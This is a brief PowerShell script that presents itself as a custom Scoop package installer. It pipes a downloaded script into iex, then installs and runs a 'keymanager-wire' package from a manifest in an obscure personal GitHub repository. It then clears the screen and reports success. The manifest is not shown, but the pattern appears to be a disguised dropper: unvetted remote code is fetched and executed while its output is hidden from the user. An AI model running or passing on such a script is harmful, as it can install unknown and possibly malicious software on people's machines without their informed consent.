
Clear-Host

Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "   ____   ____ ___   ___  ____  " -ForegroundColor Cyan
Write-Host "  / ___| / ___/ _ \ / _ \|  _ \ " -ForegroundColor Cyan
Write-Host "  \___ \| |  | | | | | | | |_) |" -ForegroundColor DarkCyan
Write-Host "   ___) | |__| |_| | |_| |  __/ " -ForegroundColor DarkCyan
Write-Host "  |____/ \____\___/ \___/|_|    " -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor DarkGray
Write-Host "       MY CUSTOM SCOOP AUTO INSTALLER                     " -ForegroundColor Yellow
Write-Host "----------------------------------------------------------" -ForegroundColor DarkGray
Write-Host ""

if (!(Get-Command scoop -ErrorAction SilentlyContinue)) {
    irm get.scoop.sh | iex | Out-Null
}

$packageName = "keymanager-wire"
$appPath = "$env:USERPROFILE\scoop\apps\$packageName"

if (!(Test-Path $appPath)) {
    scoop install https://raw.githubusercontent.com/scoopdev961/lab/refs/heads/main/key-manager.json
    wire
} else {
    wire
}

Clear-Host

Write-Host ""
Write-Host " All package management tasks completed successfully! " -ForegroundColor Green
Write-Host ""

